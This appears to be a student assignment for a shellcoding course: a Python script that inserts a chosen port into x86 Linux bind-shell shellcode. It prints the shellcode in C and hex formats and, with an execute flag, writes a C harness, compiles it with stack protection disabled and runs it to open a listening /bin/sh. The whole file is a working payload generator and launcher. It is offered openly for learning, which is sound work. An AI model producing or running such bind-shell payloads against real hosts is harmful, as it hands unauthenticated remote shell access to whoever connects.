import sys
import argparse
import os

parser = argparse.ArgumentParser(description="Bind-Shell Creator SLAE assignment 1")
parser.add_argument('-p', '--port', help='defines the bind port, choose port 1024 to 65535 (default = 4444)', dest='port')
parser.add_argument('-e', '--execute', help='executes the bind shell', action='store_true', dest='execute')
results = parser.parse_args()

results.port = int(results.port)

if results.port < 1024 or results.port > 65535:
    sys.exit()

## port becomes hex 0x400 to 0xffff -> cut off 0x
port = hex(results.port)[2:]
## fill up with zero until we have 4 characters
port = port.zfill(4)
port = "\\x{}\\x{}".format(port[0:2], port[2:4])

shellcode_c = "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x5e\\x52\\x68\\x02\\x00{}\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x89\\x41\\x04\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x43\\xb0\\x66\\xcd\\x80\\x93\\x59\\x6a\\x3f\\x58\\xcd\\x80\\x49\\x79\\xf8\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80".format(port)
shellcode_hex = shellcode_c.replace('\\x', '')

print("Shellcode in C-Format:")
print("Shellcode length = {} bytes".format(len(shellcode_hex)))
print("unsigned char code[] = \\")
print('\"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x5e\\x52\"')
print('\"\\x68\\x02\\x00{}\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x89\\x41\"'.format(port))
print('\"\\x04\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x43\\xb0\\x66\\xcd\\x80\\x93\\x59\\x6a\\x3f\\x58\\xcd\"')
print('\"\\x80\\x49\\x79\\xf8\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\"')
print('\"\\x89\\xe1\\xb0\\x0b\\xcd\\x80;\"')

print("\nShellcode in Hex-Format:")
print(shellcode_hex[:80])
print(shellcode_hex[80:160])

if results.execute:

    print("Spawn binding shell on port " + str(results.port))
    print("listening...")

    f = open("shellcode.c", "w")
    f.write('#include<stdio.h>')
    f.write('\n#include<string.h>')
    f.write('\nunsigned char code[] = \\')
    f.write('\n\"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x5e\\x52\"')
    f.write('\n\"\\x68\\x02\\x00{}\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x89\\x41\"'.format(port))
    f.write('\n\"\\x04\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x43\\xb0\\x66\\xcd\\x80\\x93\\x59\\x6a\\x3f\\x58\\xcd\"')
    f.write('\n\"\\x80\\x49\\x79\\xf8\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\"')
    f.write('\n\"\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";')
    f.write('\nint main(){')
    f.write('\nint (*ret)() = (int(*)())code;')
    f.write('\nret();}')
    f.close()

    os.system("gcc -fno-stack-protector -z execstack -m32 shellcode.c -o bind_shell")
    os.system("bind_shell")





